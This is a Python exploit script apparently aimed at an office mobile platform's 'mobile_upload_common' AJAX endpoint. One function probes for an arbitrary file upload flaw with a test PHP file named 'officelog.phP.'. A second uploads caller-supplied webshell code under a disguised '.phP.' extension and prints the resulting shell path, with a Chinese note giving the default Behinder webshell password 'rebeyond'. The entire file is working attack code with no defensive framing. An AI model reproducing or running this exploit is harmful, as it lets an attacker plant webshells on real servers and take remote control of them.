
import requests
from urllib import parse
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfpXTi6B3OoWU95DI"

}


def exp_check(url):
    try:
        data = (    "------WebKitFormBoundaryfpXTi6B3OoWU95DI\r\n"
                    "Content-Disposition: form-data; name=\"upload_quwan_common\"; filename=\"officelog.phP.\"\r\n"
                    "Content-Type: application/octet-stream\r\n\r\n"
                    "<?php echo 123;?>\r\n"
                    "------WebKitFormBoundaryfpXTi6B3OoWU95DI--"
                )

        path = "/e-mobile/app/Ajax/ajax.php?action=mobile_upload_common"
        rsp = requests.post(url+path,data=data,headers=header,verify=False)
        if "officelog.phP" in rsp.text:
            return 1
        else:
            return 2
    except Exception as e:
        print(e.__traceback__.tb_lineno,e)
        return 3

def exp_upload(url,data,shellName):
    try:
        t = ""
        data = parse.unquote(data)
        for i in range(len(shellName)):
            if shellName[i] == ".":
                break
            t += shellName[i]
        print(data)
        payload = ("------WebKitFormBoundaryfpXTi6B3OoWU95DI\r\n"
                    "Content-Disposition: form-data; name=\"upload_quwan_common\"; filename=\""+t+".phP.\"\r\n"
                    "Content-Type: application/octet-stream\r\n\r\n"
                    ""+data+"\r\n"
                    "------WebKitFormBoundaryfpXTi6B3OoWU95DI--\r\n"
                    )
        path = "/e-mobile/app/Ajax/ajax.php?action=mobile_upload_common"
        rsp = requests.post(url+path,data=payload,headers=header,verify=False)
        tmp = rsp.text.split(",")
        pa = "/attachment/"+tmp[2]+"/"+t+".phP."
        if "{}.phP".format(t) in rsp.text:
            return ("Webshell路径如下：\r\n"
                    "{}"+pa +"\r\n  if:使用默认的 为冰蝎码：rebeyond"
                    ).format(url)
    except Exception as e:
        print(e.__traceback__.tb_lineno,e)
        return 3
